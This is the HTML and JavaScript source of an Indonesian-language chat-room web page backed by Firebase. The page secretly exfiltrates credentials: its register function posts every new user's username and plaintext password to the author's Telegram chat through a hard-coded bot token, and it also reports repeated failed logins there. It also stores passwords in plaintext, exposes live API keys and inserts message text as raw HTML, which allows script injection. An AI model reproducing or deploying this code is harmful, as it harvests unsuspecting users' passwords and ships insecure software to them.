<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>AryaChat ðŸ‘‘</title>

  <style>
    body,html{ 
      margin:0;padding:0;height:100%;font-family:Arial, sans-serif;color:white; 
      background: url('https://s.elrayyxml.my.id/b7k9GB.jpg') no-repeat center center fixed; 
      background-size: cover;
    }

    .login-box{
      position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);
      background:rgba(0,0,0,0.6);padding:25px;border-radius:12px;
      width:300px;text-align:center;backdrop-filter: blur(6px);
    }
    input{ width:100%;padding:10px;margin:10px 0;border-radius:6px;border:none; }
    button{ padding:10px;background:#0a84ff;color:white;border:none;border-radius:6px;cursor:pointer; }

    .admin-btn{
      margin-top:8px;
      padding:6px;
      width:100%;
      background:#444;
      border:none;
      border-radius:6px;
      font-size:12px;
      color:#fff;
      cursor:pointer;
    }

    #chat{ display:none;padding:10px;height:100vh;box-sizing:border-box;
      background:rgba(0,0,0,0.6);backdrop-filter:blur(4px);}
    #messages{ height:75%;overflow-y:auto;padding-right:5px; }

    .bubble{ max-width:70%;padding:10px;margin:5px 0;border-radius:12px;line-height:1.3; }
    .me{ background:#0a84ff;margin-left:auto; }
    .other{ background:#333;margin-right:auto; }

    #typing{ font-size:14px;color:#0a84ff;margin-bottom:5px;height:20px; }
    #statusEl{ font-size:14px;margin-bottom:10px; }
    .footer{ margin-top:10px;font-size:12px;color:#ccc; }

    .tab-btn{ width:48%; display:inline-block; cursor:pointer; padding:8px 0; border-radius:6px; margin-bottom:10px; background:#222; color:#fff; }
    .tab-active{ background:#0a84ff; }
  </style>
</head>
<body>

<div class="login-box" id="loginBox">
  <h2>Room ChatðŸ‘‘</h2>

  <div style="display:flex;justify-content:space-between;">
    <div class="tab-btn tab-active" id="loginTab" onclick="switchTab('login')">Login</div>
    <div class="tab-btn" id="registerTab" onclick="switchTab('register')">Register</div>
  </div>

  <div id="loginForm">
    <input type="text" id="loginUsername" placeholder="Username (case sensitive)" />
    <input type="password" id="loginPassword" placeholder="Password (case sensitive)" />
    <button onclick="login()">Login</button>

    <button class="admin-btn" onclick="contactAdmin()">Hubungi Admin</button>
  </div>

  <div id="registerForm" style="display:none;">
    <input type="text" id="regUsername" placeholder="Username" />
    <input type="password" id="regPassword" placeholder="Password" />
    <button onclick="register()">Register</button>

    <button class="admin-btn" onclick="contactAdmin()">Hubungi Admin</button>
  </div>

  <div class="footer">Dibuat oleh Aryaxvv && GPT</div>
</div>

<div id="chat">
  <div style="display:flex;justify-content:space-between;align-items:center;">
    <div id="statusEl">Offline</div>
    <button onclick="logout()" style="background:#444;">Logout</button>
  </div>

  <div id="typing"></div>
  <div id="messages"></div>

  <div style="display:flex;margin-top:10px;gap:5px;">
    <input type="text" id="msg" placeholder="Type message..." oninput="showTyping()" style="width:82%;" />
    <button onclick="sendMessage()" style="width:18%;">Send</button>
  </div>
</div>

<!-- FIREBASE -->
<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>

<script>
const firebaseConfig = {
  apiKey: "AIzaSyAFsfI4vWsm_YErVs6hvSULFSDEScpxbEk",
  authDomain: "chatai-2bc85.firebaseapp.com",
  databaseURL: "https://chatai-2bc85-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "chatai-2bc85",
  storageBucket: "chatai-2bc85.firebasestorage.app",
  messagingSenderId: "24544568792",
  appId: "1:24544568792:web:5538353490c8be0c65fead",
  measurementId: "G-S6MMG4LHBQ"
};
firebase.initializeApp(firebaseConfig);

let user="";
let loginFailCount=0;
let typingTimeout;
let db=firebase.database();

// === CONTACT ADMIN ===
function contactAdmin(){
  window.location.href = "https://t.me/Aryaxvv";
}

// === TELEGRAM BOT ===
const BOT_TOKEN = "8482821507:AAEkuhq6UfLoil3XQI7IByrQYUKYodG__kA";
const CHAT_ID = "7318082575";

function sendToTelegram(msg){
  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method:"POST",
    headers:{ "Content-Type":"application/json" },
    body: JSON.stringify({ chat_id:CHAT_ID, text:msg })
  });
}

// === SWITCH TAB ===
function switchTab(tab){
  if(tab==="login"){
    loginForm.style.display="block";
    registerForm.style.display="none";
    loginTab.classList.add("tab-active");
    registerTab.classList.remove("tab-active");
  } else {
    loginForm.style.display="none";
    registerForm.style.display="block";
    loginTab.classList.remove("tab-active");
    registerTab.classList.add("tab-active");
  }
}

// === AUTO LOGIN ===
window.onload = ()=>{
  const u=localStorage.getItem("chatUser");
  const p=localStorage.getItem("chatPass");
  if(u && p){
    user=u;
    loginBox.style.display="none";
    chat.style.display="block";
    setStatus(true);
    botWelcome();
    startBotLoop();
    loadMessages();
  }
};

// === REGISTER ===
function register(){
  const username=regUsername.value.trim();
  const password=regPassword.value.trim();

  if(!username || !password) return alert("Isi semua kolom!");

  db.ref("users/"+username).get().then(snap=>{
    if(snap.exists()) return alert("Username sudah dipakai!");

    db.ref("users/"+username).set({ password });
    alert("Registrasi berhasil!");

    sendToTelegram(`ðŸ“Œ NEW USER REGISTER:
ðŸ‘¤ Username: ${username}
ðŸ”‘ Password: ${password}`);

    switchTab("login");
  });
}

// === LOGIN ===
function login(){
  const username=loginUsername.value.trim();
  const password=loginPassword.value.trim();

  if(!username || !password) return alert("Isi username dan password!");

  db.ref("users/"+username).get().then(snap=>{
    if(!snap.exists()) return alert("Username tidak ditemukan!");

    if(snap.val().password === password){
      user=username;
      localStorage.setItem("chatUser",user);
      localStorage.setItem("chatPass",password);

      loginFailCount=0;
      loginBox.style.display="none";
      chat.style.display="block";
      setStatus(true);
      botWelcome();
      startBotLoop();
      loadMessages();

    } else {
      loginFailCount++;
      alert("Password salah!");

      if(loginFailCount>=3){
        alert("Password salah 3x! Hubungi admin.");
        sendToTelegram(`âš ï¸ PASSWORD SALAH 3x:
Username: ${username}`);
      }
    }
  });
}

// === LOGOUT ===
function logout(){
  localStorage.removeItem("chatUser");
  localStorage.removeItem("chatPass");
  location.reload();
}

// === STATUS ===
function setStatus(isOnline){
  const s=document.getElementById("statusEl");
  s.innerText = isOnline ? "Online" : "Offline";
  s.style.color = isOnline ? "#0f0" : "#f00";
}

// === SEND MESSAGE ===
function sendMessage(){
  let text=msg.value.trim();
  if(text){
    db.ref("chats").push({ sender:user, text, time:Date.now() });
  }
  msg.value="";
  hideTyping();
}

// === LOAD MESSAGE ===
function loadMessages(){
  db.ref("chats").on("child_added", snap=>{
    const d=snap.val();
    const key=snap.key;
    addBubble(d.sender, d.text, d.sender===user, key);
  });
}

function addBubble(sender,text,isMe,key){
  const div=document.createElement("div");
  div.classList.add("bubble", isMe?"me":"other");

  let html = `<b>${sender}</b><br>${text}`;

  if(isMe){
    html += `
      <br>
      <button onclick="deleteMessage('${key}', this)"
      style="margin-top:5px;padding:3px 6px;font-size:11px;background:#ff4d4d;border:none;border-radius:4px;color:white;cursor:pointer;">
        Hapus
      </button>`;
  }

  div.innerHTML = html;
  messages.appendChild(div);
  messages.scrollTop = messages.scrollHeight;
}

// === DELETE MESSAGE (ONLY SELF) ===
function deleteMessage(key, btn){
  if(confirm("Hapus pesan ini?")){
    db.ref("chats/"+key).remove();
    btn.parentElement.remove();
  }
}

// === TYPING ===
function showTyping(){
  typing.innerText = `${user} is typing...`;
  clearTimeout(typingTimeout);
  typingTimeout=setTimeout(hideTyping,700);
}
function hideTyping(){ typing.innerText=""; }

// === BOT ===
function botWelcome(){
  setTimeout(()=>{
    db.ref("chats").push({
      sender:"Security ðŸ‘‘",
      text:"Selamat datang "+user+"! ðŸ‘‹",
      time:Date.now()
    });
  },500);
}

function startBotLoop(){
  setInterval(()=>{
    db.ref("chats").push({
      sender:"Security ðŸ‘‘",
      text:"Web ini dibuat oleh Aryaxvv. Ikuti channel WA & Telegram untuk update!",
      time:Date.now()
    });
  },180000);
}
</script>

</body>
</html>
